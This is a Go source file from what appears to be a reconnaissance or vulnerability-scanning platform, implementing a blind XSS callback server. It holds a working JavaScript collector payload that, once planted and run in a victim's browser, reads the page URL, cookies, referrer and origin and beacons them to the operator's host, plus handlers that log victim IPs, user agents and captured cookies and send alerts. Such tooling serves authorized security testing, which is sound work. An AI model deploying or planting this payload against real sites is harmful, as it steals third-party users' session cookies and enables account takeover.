package api

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/gorilla/mux"
	"github.com/recon-platform/internal/scanner"
)

// blindXSSCollector is the JS served at /bx/<token>.js. When a victim's browser
// runs the planted <script src=...>, this collects the page context and beacons
// it back to /bx/<token> via an image request (no CORS needed). Kept tiny and
// dependency-free.
const blindXSSCollector = `(function(){try{var t=%q;var d=document;var b=%q;` +
	`var q='?u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(d.cookie||'')+` +
	`'&r='+encodeURIComponent(d.referrer||'')+'&o='+encodeURIComponent(location.origin||'');` +
	`new Image().src=b+'/bx/'+t+q;}catch(e){}})();`

// handleBlindXSSJS serves the collector payload for a token (the src target of
// the planted <script>). Public, no auth — victim browsers must reach it.
func (h *Handler) handleBlindXSSJS(w http.ResponseWriter, r *http.Request) {
	token := sanitizeToken(mux.Vars(r)["token"])
	base := strings.TrimRight(h.cfg.BlindXSSCallbackURL, "/")
	w.Header().Set("Content-Type", "application/javascript")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	// Record the load itself, in case the collector's follow-up beacon is blocked.
	h.recordBlindHit(r, token, "", "", "", "script-load")
	fmt.Fprintf(w, blindXSSCollector, token, base)
}

// handleBlindXSSCallback records a confirmed blind/stored XSS execution. Public,
// no auth. Returns a 1x1 transparent GIF so the collector's Image() succeeds.
func (h *Handler) handleBlindXSSCallback(w http.ResponseWriter, r *http.Request) {
	token := sanitizeToken(mux.Vars(r)["token"])
	q := r.URL.Query()
	h.recordBlindHit(r, token, q.Get("u"), q.Get("c"), q.Get("r"), "beacon")

	// 1x1 transparent GIF.
	gif := []byte{
		0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00,
		0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x21, 0xf9, 0x04, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
		0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b,
	}
	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Cache-Control", "no-store")
	w.Write(gif)
}

// recordBlindHit looks up the probe token, updates its hit stats, and raises a
// confirmed blind-XSS finding the first time it fires.
func (h *Handler) recordBlindHit(r *http.Request, token, pageURL, cookies, referer, via string) {
	if token == "" {
		return
	}
	var targetID, injURL, param, sink string
	var priorHits int
	err := h.db.QueryRow(`
		SELECT target_id, url, parameter, sink, hit_count
		FROM blind_xss_probes WHERE token = ?`, token).
		Scan(&targetID, &injURL, &param, &sink, &priorHits)
	if err != nil {
		return // unknown token — ignore stray traffic
	}

	// Truncate collected values so a huge cookie/URL can't bloat the row.
	pageURL = truncateStr(pageURL, 500)
	cookies = truncateStr(cookies, 500)
	referer = truncateStr(referer, 500)

	evidence := fmt.Sprintf(
		"Blind XSS executed (%s). Injected via %s (sink: %s). Fired on page: %s | referer: %s | victim UA: %s | victim IP: %s%s",
		via, injURL, sink, orDash(pageURL), orDash(referer),
		truncateStr(r.UserAgent(), 200), clientIP(r), cookieNote(cookies))

	_, _ = h.db.Exec(`
		UPDATE blind_xss_probes
		SET hit_count = hit_count + 1, last_hit = CURRENT_TIMESTAMP, evidence = ?
		WHERE token = ?`, evidence, token)

	// A callback is runtime proof. Route it through the same audited lifecycle as
	// every other detector; repeated hits are idempotent by candidate fingerprint.
	_, _ = scanner.RecordDetectorObservation(r.Context(), h.db, scanner.DetectorObservation{
		TargetID: targetID, Type: "blind_xss", Subtype: "callback", Severity: "critical",
		URL: injURL, Method: "CALLBACK", Parameter: param, Location: sink,
		Payload: "blind-xss beacon token=" + token, Evidence: evidence,
		Source: "blind-xss-callback", DetectionMethod: via,
		Confidence: 100, Priority: 500, Verdict: scanner.VerifyVerified,
	})

	// Broadcast + Telegram alert through the scheduler's scoring path (first hit
	// only, to avoid alert spam on repeated victim loads).
	if priorHits == 0 && h.sched != nil {
		h.sched.EmitVulnFinding(map[string]any{
			"target_id": targetID, "type": "blind_xss", "url": injURL, "parameter": param,
		})
	}
	h.logger.Warn("Blind XSS callback fired", "token", token, "target", targetID, "sink", sink)
}

func sanitizeToken(t string) string {
	t = strings.TrimSuffix(t, ".js")
	var b strings.Builder
	for _, r := range t {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			b.WriteRune(r)
		}
	}
	return truncateStr(b.String(), 64)
}

func truncateStr(s string, n int) string {
	if len(s) > n {
		return s[:n] + "…"
	}
	return s
}

func orDash(s string) string {
	if s == "" {
		return "-"
	}
	return s
}

func cookieNote(c string) string {
	if c == "" {
		return ""
	}
	return " | cookies captured: " + c
}

func clientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		return strings.TrimSpace(strings.Split(xff, ",")[0])
	}
	if i := strings.LastIndex(r.RemoteAddr, ":"); i >= 0 {
		return r.RemoteAddr[:i]
	}
	return r.RemoteAddr
}
